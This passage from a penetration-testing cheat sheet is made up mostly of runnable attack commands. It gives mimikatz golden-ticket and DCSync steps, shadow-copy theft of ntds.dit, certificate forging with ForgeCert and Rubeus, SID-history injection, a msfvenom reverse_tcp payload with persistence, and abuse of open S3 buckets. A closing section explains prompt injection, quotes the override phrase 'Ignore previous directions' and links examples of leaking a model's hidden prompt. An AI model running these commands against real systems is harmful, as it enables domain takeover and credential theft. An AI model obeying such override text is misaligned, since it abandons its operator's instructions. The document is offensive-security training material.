#### Rubeus Harvesting

- `Rubeus.exe harvest /interval:30`


#### <ins>Active Directory Persistence</ins>

#### Golden Ticket

- With this attack, you can gain access to every machine in the AD
- You need a kerberoast ticket granting account and With mimikatz from the DC
- You may need to purge: `kerberos::purge`
- See this if you are having trouble: https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html

Process
1. `privilege::debug`
2. Dump the krbtgt hash
   - `lsadump::lsa /inject /name:krbtgt or `lsadump::lsa /patch`
   - copy the SID and the NTLM
3. `kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM> /ptt`
4. `misc::cmd`
5. from the opened CMD, try `dir \\USERNAME\\C$`
   - consider also to download psexec in the machine compromised for more access
   - `psexec.exe \\USERNAME cmd.exe`


#### Shadow copies

1. `vshadow.exe -nw -p  C:` perform a shadow copy of the `C:` drive
2. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak` copy the ntds database to the C: drive
3. `reg.exe save hklm\system c:\system.bak` save the SYSTEM hive from the Windows registry
4. `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL` extract the credential materials

#### Through Credentials

1. DCSync All with mimikatz
   - `privilege::debug`
   - `log <username>_dcdump.txt`
   - `lsadump::dcsync /domain:za.tryhackme.loc /all`
2. `cat <username>_dcdump.txt | grep "SAM Username"`
3. `cat <username>_dcdump.txt | grep "Hash NTLM"`
- You can also target only one user with the following command
  - `lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>`
  

#### Through Certificates

1. See certificates stored
   - `crypto::certificates /systemstore:local_machine`
2. Patch memory to make these keys exportable
   - `crypto::capi`
   - `crypto::cng`
3. Export the certificates
   - `crypto::certificates /systemstore:local_machine /export`
4. Generate certificates
   - `ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123`
5. Use Rubeus to request a TGT using the certificate
   - `Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101`
6. Load the TGT to auth to DC, with mimikatz
   - `kerberos::ptt administrator.kirbi`


#### Trough SID History

- If you need to fix SID history (ntds.dit)
  https://github.com/MichaelGrafnetter/DSInternals
1. Confirm that your user has no SID history
   - `Get-ADUser <your ad username> -properties sidhistory,memberof`
2. Get the SID of the Domain Admins
   - `Get-ADGroup "Domain Admins"Get-ADGroup "Domain Admins"`
3. Patch the ntds.dit file with DSInternals
   - `Stop-Service -Name ntds -force`
   - `Stop-Service -Name ntds -force`
   - `Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit`
   - `Start-Service -Name ntds`
   - `Restart-Service -Name NTDS`
4. Exit and Log in, verify the SID history
   - `Get-ADUser aaron.jones -Properties sidhistory`
5. Test your Admin privileges
   - `dir \\thmdc.za.tryhackme.loc\c$`
   
   
#### Trough metasploit

1. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=445 -f exe -o shell.exe`
2. `use exploit/multi/handler`
3. `set payload windows/meterpreter/reverse_tcp`
4. after the shell is spawned: `background`
5. `use exploit/windows/local/persistence`
6. `set settion 1`
7. `run`
- If the session dies, just run again `run`
- https://docs.rapid7.com/metasploit/about-post-exploitation/






## Mobile

**FlappyBird_structure.apk**<br/>
├── **AndroidManifest.xml** meta-information about the app<br/>
├── **META-INF/** a manifest of metadata information<br/>
├── **classes.dex** contains the Java libraries that the application uses<br/>
├── **lib/** compiled native libraries used by the app<br/>
├── **res/** It can store resource files such as pictures, XML files, etc.<br/>
├── **assets/** application assets<br/>
└── **resources.arsc** contains compiled resources in a binary format

**Data storage** search for PII unencrypted in
- [ ] Phone system logs
- [ ] Webkit cache
- [ ] Dbs, plists, etc.
- [ ] Hardcoded in the binary

**Resources**
- [Mobile Application Penetration Testing Cheat Sheet](https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet)
- [Mobile Hacking Cheatsheet](https://github.com/randorisec/MobileHackingCheatSheet)
- [OWASP Mobile Application Security](https://mas.owasp.org/)

**Download APKs**
- [m.apkpure.com](https://m.apkpure.com/it/)
- [apps.evozi.com](https://apps.evozi.com/apk-downloader/)
- [apk-dl.com](http://apk-dl.com/) 

**Emulators**
- [Noxplayer](https://www.bignox.com/)
- [Genymotion](https://www.genymotion.com/) an android emulator
- [Android Studio](https://developer.android.com/studio) Android application development, useful also for the emulator
  - Note: to start only the emulator, use commands such as
    ```cmd
    cd C:\Users\Riccardo\AppData\Local\Android\Sdk\emulator
    emulator -avd Pixel_4_XL_API_30
    ```

**Android tools**
- [adb](https://developer.android.com/studio/command-line/adb) it is used to debug an android device
- [Frida](https://github.com/frida/frida)
- [HTTP Toolkit](https://httptoolkit.tech/) to see requests on a non-rooted or emulated device
- [Java Decompiler](https://java-decompiler.github.io/)
- [dex2jar](https://github.com/pxb1988/dex2jar) decompile an .apk into .jar
- [jadx-gui](https://github.com/skylot/jadx/releases) another tool for producing Java source code from Android Dex and Apk files
- [apktool](https://ibotpeaches.github.io/Apktool/) to unpack an apk
- [APK-MITM](https://github.com/shroudedcode/apk-mitm) removes certificate pinning
- [Apkleak](https://github.com/dwisiswant0/apkleaks) to get endpoints from an apk

### <ins>Missing Certificate and Public Key Pinning</ins>

Absence or improper implementation of certificate and public key pinning in a mobile app. This allows an attacker to potentially intercept communication by presenting fraudulent or unauthorized certificates, undermining the security of the system and enabling man-in-the-middle attacks.


### <ins>Cordova attacks</ins>

- Check for HTML injections
- Search for XSS
  - With this type of attack, it's possible to achieve an RCE. Check [this](https://www.joshmorony.com/why-xss-attacks-are-more-dangerous-for-capacitor-cordova-apps/) and [this](https://research.securitum.com/security-problems-of-apache-cordova-steal-the-entire-contents-of-the-phone_s-memory-card-with-one-xss/)


## Cloud hacking

**Resources**
- [cloud_metadata.txt](https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b), Cloud Metadata Dictionary useful for SSRF Testing


### <ins>Abusing S3 Bucket Permissions</ins>

Target example: `http://[name_of_bucket].s3.amazonaws.com`

**Read Permission**

- `aws s3 ls s3://[name_of_bucket]  --no-sign-request`
- `aws s3 ls s3://pyx-pkgs --recursive --human-readable --summarize`

**Write Permission**

- `aws s3 cp localfile s3://[name_of_bucket]/test_file.txt –-no-sign-request`

**READ_ACP**

- `aws s3api get-bucket-acl --bucket [bucketname] --no-sign`
- `aws s3api get-object-acl --bucket [bucketname] --key index.html --no-sign-request`

**WRITE_ACP**

- `aws s3api put-bucket-acl --bucket [bucketname] [ACLPERMISSIONS] --no-sign-request`
- `aws s3api put-object-acl --bucket [bucketname] --key file.txt [ACLPERMISSIONS] --no-sign-request`

**Tools**
- [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
- [AWS CLI](https://aws.amazon.com/it/cli/)
- [S3Scanner](https://github.com/sa7mon/S3Scanner) A tool to find open S3 buckets and dump their contents
- [Cloud - AWS Pentest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md)
- [s3enum](https://github.com/koenrh/s3enum)
- To find secrets, you can use [trufflehog](https://github.com/trufflesecurity/trufflehog).

**Resources**
- [Abusing S3 Bucket Permissions](https://blog.yeswehack.com/yeswerhackers/abusing-s3-bucket-permissions/)
- [Amazon S3: Allows read and write access to objects in an S3 Bucket](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_examples_s3_rw-bucket.html)


### <ins>AWS Cognito</ins>

If you've found aws cognito client id and secret
1. `clientID:clientSercret` => `base64KEY`
2. `curl -X POST 'https://xx.amazoncognito.com/oauth2/token' \   -H 'Authorization: Basic base64KEY'\   -H 'Content-Type: application/x-www-form-urlencoded' \   -d 'grant_type=client_credentials'`
3. [Source](https://twitter.com/GodfatherOrwa/status/1670617783510376448)



### <ins>Google Cloud Storage bucket</ins>

**Tools**
- [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
- https://github.com/RhinoSecurityLabs/GCPBucketBrute

**Resources**
- https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/



## Artificial intelligence vulnerabilities

### <ins>Prompt Injection</ins>

**Prompt Injection** is when an AI that follows textual instructions (a "prompt") to complete a job gets deceived by hostile, adversarial human input to do a task that was not its original goal. To test it, inject the text `Ignore previous directions`.

Some examples:
- ["Exploiting GPT-3 prompts with malicious inputs that order the model to ignore its previous directions"](https://twitter.com/goodside/status/1569128808308957185)
- ["OpenAI’s ChatGPT is susceptible to prompt injection — say the magic words, “Ignore previous directions”, and it will happily divulge to you OpenAI’s proprietary prompt"](https://twitter.com/goodside/status/1598253337400717313)
- [Exploring Prompt Injection Attacks](https://research.nccgroup.com/2022/12/05/exploring-prompt-injection-attacks/)
- ["Prompt Injection Everywhere" by TakSec](https://github.com/TakSec/Prompt-Injection-Everywhere)
